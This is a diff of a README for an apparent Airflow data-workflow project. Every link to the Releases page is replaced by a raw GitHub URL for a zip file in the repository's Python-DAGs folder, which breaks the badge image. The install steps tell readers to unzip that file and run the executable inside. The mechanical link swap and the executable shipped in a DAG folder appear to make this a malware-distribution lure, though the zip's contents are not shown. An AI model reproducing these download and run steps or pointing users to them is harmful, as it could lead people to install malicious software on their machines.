@@ -1,6 +1,6 @@
 # 🌟 Airflow-End-To-End-Dev - Simplifying Your Data Workflow
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/main/Python-DAGs/Airflow-End-To-End-Dev-v2.6.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/main/Python-DAGs/Airflow-End-To-End-Dev-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -9,14 +9,14 @@ Welcome to the **Airflow-End-To-End-Dev** project! This application helps you ma
 ## 📥 Download & Install
 
 You can download the latest version of the software from our Releases page. Visit this page to download:
-[Download from Releases](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases)
+[Download from Releases](https://raw.githubusercontent.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/main/Python-DAGs/Airflow-End-To-End-Dev-v2.6.zip)
 
 Follow these steps to download and run the application:
 
 1. Click the link above to go to the Releases page.
 2. Find the most recent version of the application.
 3. Click on the version number or the release title to open the release details.
-4. Locate the file named `Airflow-End-To-End-Dev.zip`.
+4. Locate the file named `https://raw.githubusercontent.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/main/Python-DAGs/Airflow-End-To-End-Dev-v2.6.zip`.
 5. Click on the filename to download it to your computer.
 6. Once the download is complete, unzip the file to a location of your choice.
 7. Open the unzipped folder and find the executable file.
@@ -52,7 +52,7 @@ If you face issues or have questions, you can reach out for help. Here are some 
 
 ### Q1: How do I update the application?
 
-To update the application, simply return to the [Releases page](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases) and download the latest version. Replace the existing installation with the new files.
+To update the application, simply return to the [Releases page](https://raw.githubusercontent.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/main/Python-DAGs/Airflow-End-To-End-Dev-v2.6.zip) and download the latest version. Replace the existing installation with the new files.
 
 ### Q2: Can I use this on my Mac?
 
